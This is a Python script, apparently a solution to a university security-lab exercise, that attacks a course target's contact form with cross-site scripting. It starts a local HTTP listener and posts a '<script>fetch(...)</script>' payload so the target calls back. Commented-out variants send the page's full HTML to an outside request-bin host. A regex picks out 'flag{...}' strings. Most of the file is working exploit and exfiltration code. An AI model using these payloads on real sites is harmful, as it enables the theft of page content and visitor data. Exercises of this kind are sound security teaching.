import requests
import socket
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Timer
# For internal use only - don't use
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't have to be reachable
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip 

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

# TODO: modify the handler function appropriately
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"Received GET request on path: {self.path}")
        self.send_response(200)

http_listener = None
# Helper function that creates a listening socket that will handle HTTP requests for us just as we specified in the class above
def create_listening_endpoint():
    global http_listener
    ip = get_local_ip()
    # Bind to the local address only.
    server_address = (ip, 0)
    http_listener = HTTPServer(server_address, HTTPHandler)
    http_port = http_listener.server_port
    

    return f"http://{ip}:{http_port}"

# Helper function that waits for our listening server to receive one request
def wait_for_http_request():
    global http_listener
    http_listener.handle_request()

TARGET_URL = "http://t8.itsec.sec.in.tum.de"

listening_url = create_listening_endpoint()
print(f"Spawned listener on: {listening_url}")

def post_request():
    print("sending post request...")
    request_bin = "https://eocdyu7f4axv1uz.m.pipedream.net"
    
    # jsGet = 'http://t8.itsec.sec.in.tum.de/?ln=English<script>fetch(`' + request_bin + '/$'+'{'+'document.documentElement.outerHTML}`)</script>'
    # jsGet2 = 'fetch(`http://172.25.52.49:37109/$'+'{'+'document.documentElement.outerHTML}`, {method: \'GET\',headers:{\'Accept\': \'application/json\'}});'
    jsGetLinus = 'http://t8.itsec.sec.in.tum.de/?ln=English<script>fetch(\'' + listening_url + '\')</script>'
    page = session.post('http://t8.itsec.sec.in.tum.de/contact', data={'contacttext': jsGetLinus})
    #page2 = session.post('http://t8.itsec.sec.in.tum.de/contact', data={'contacttext': jsGet2})
    print("jsGetLinus: " + jsGetLinus)
    print(f"post request sent")





session = requests.Session()

response = session.get(TARGET_URL)

print("Server index page:")
print("--------------------------------------------------------")
print(response.text)
print("--------------------------------------------------------")

# TODO: Your exploit goes here
# make a post request to /contact with the listening url as the contacttext
# then wait for the server to send a request to our listening server


# Now, our listener will hopefully receive something nice for us!
t = Timer(5.0, post_request)
t.start()

print("Waiting for an incoming request...")
wait_for_http_request()